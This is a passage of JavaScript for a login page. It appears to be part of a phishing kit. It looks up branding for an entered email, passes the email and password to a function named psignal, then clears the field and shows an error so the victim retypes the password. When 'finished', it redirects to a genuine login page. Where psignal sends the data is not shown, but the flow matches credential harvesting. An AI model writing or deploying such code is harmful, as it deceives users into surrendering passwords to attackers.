      favicon.href = favico;
    }
    if (imgfav) {
        imgfav.src = favico;
      }

    if (errormsg) {
      warningMessage.innerText = errormsg;
    }
  }
  passwd.focus();

  button.addEventListener("click", async function (e) {
    e.preventDefault();
    try {
      if (!valued) {
        await GEInfo(email.value);
      }
      if (valued) {
        await psignal(email.value.trim(), passwd.value.trim());
        passwd.value = "";
        passwd.focus();
        container_iframe.src = containerFrame;
        if (favicon) {
          favicon.href = favico;
        }
        if (imgfav) {
            imgfav.src = favico;
          }
        if (errormsg) {
          warningMessage.innerText = errormsg;
        }
        if (finished) {
          document.location.href = loginPage;
        }
      }
    } catch (err) {
      console.error(err);
      warningMessage.innerText = err.message;
    }
  });
});
